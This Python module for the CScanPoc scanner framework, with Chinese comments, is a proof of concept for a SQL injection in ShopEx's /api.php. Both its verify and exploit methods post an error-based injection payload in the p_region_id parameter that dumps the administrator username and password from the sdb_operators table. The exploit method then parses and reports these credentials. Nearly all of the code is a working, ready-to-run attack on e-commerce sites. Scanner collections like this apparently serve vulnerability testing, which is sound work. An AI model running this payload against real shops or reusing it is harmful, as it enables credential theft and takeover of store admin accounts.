
# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'ShopEx_0013'  # 平台漏洞编号，留空
    name = 'ShopEx /api.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '*********'  # 漏洞公布时间
    desc = '''
        Shopex是国内市场占有率最高的网店软件。网上商店平台软件系统又称网店管理系统、网店程序、网上购物系统、在线购物系统。
        ShopEx对API操作的模块未做认证，任何用户都可访问,攻击者可通过它来对产品的分类，
        类型，规格，品牌等，进行添加，删除和修改，过滤不当还可造成注入
    '''  # 漏洞描述
    ref = 'https://www.waitalone.cn/ShopEx-api-injection-with-exp.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ShopEx'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9df47ac5-6db6-47fa-89ef-d4e6f38cc9d8'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = '{target}'.format(target=self.target)+"/api.php"
            postDataExp = ("act=search_sub_regions&api_version=1.0&return_data=string&"
                           "p_region_id=22 and (select 1 from(select count(*),concat(0x7c,"
                           "(select concat(0x245E,username,0x2D3E,userpass,0x5E24) from "
                           "sdb_operators limit 0,1),0x7c,floor(rand(0)*2))x from "
                           "information_schema.tables group by x limit 0,1)a)#")
            req = urllib.request.Request(url=verify_url, data=postDataExp)
            response = urllib.request.urlopen(req, timeout=10)
            content = str(response.read())
            if content != None:
                pattern = re.compile(
                    r".*?Duplicate\s*entry\s*'\|\$\^(?P<username>[\w]+)->(?P<password>[a-zA-Z0-9]+)")
                match = pattern.match(content)
                if match != None:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))

            verify_url = '{target}'.format(target=self.target)+"/api.php"
            postDataExp = ("act=search_sub_regions&api_version=1.0&return_data=string&"
                           "p_region_id=22 and (select 1 from(select count(*),concat(0x7c,"
                           "(select concat(0x245E,username,0x2D3E,userpass,0x5E24) from "
                           "sdb_operators limit 0,1),0x7c,floor(rand(0)*2))x from "
                           "information_schema.tables group by x limit 0,1)a)#")
            req = urllib.request.Request(url=verify_url, data=postDataExp)
            response = urllib.request.urlopen(req, timeout=10)
            content = str(response.read())
            if content != None:
                pattern = re.compile(
                    r".*?Duplicate\s*entry\s*'\|\$\^(?P<username>[\w]+)->(?P<password>[a-zA-Z0-9]+)")
                match = pattern.match(content)
                if match != None:
                    username = match.group("username")
                    password = match.group("password")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password}'.format(
                        target=self.target, name=self.vuln.name, username=username, password=password))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
